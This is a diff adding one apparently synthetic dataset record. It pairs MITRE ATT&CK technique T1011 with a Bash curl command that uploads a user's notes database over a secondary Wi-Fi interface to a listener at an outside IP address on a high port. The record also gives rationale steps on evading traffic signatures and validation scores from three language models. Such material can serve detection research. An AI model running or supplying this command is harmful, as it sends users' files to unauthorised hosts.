@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && curl --silent --show-error --interface wlan1 --max-time 5 -T /home/user/.config/notes.db http://10.55.88.9:49190/upload",
+  "explanation": "Uses curl bound to wlan1 to PUT a file to an HTTP listener on a high port, representing exfiltration over a different network medium per T1011.",
+  "rationale_steps": [
+    "Check wlan1 operability with iwconfig.",
+    "Force the HTTP transfer over wlan1 via curl's --interface option.",
+    "Use an uncommon port to avoid typical web traffic signatures while not altering system routing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-998ddfac",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed Bash with correct redirections, logical operator usage, and valid curl flags.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates a file over Wi-Fi by binding curl to wlan1 (aligning with T1011), but as an unprivileged user on Linux --interface may fail when using an interface name and iwconfig does not verify link or route availability.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T00:01:32.531940Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command chaining (&&), valid flags for both iwconfig and curl, correct redirection of output (>/dev/null 2>&1), and appropriate parameter usage.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by first checking if the secondary network interface (wlan1) is available and then using curl to exfiltrate a database file over that specific interface to an external server on a high port.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T00:01:40.737672Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid flags, correct command separators, and proper redirection without any syntax errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by explicitly binding `curl` to `wlan1` to exfiltrate a file via HTTP, directly aligning with the T1011 technique of using an 'other network medium' for data exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T00:01:49.338312Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
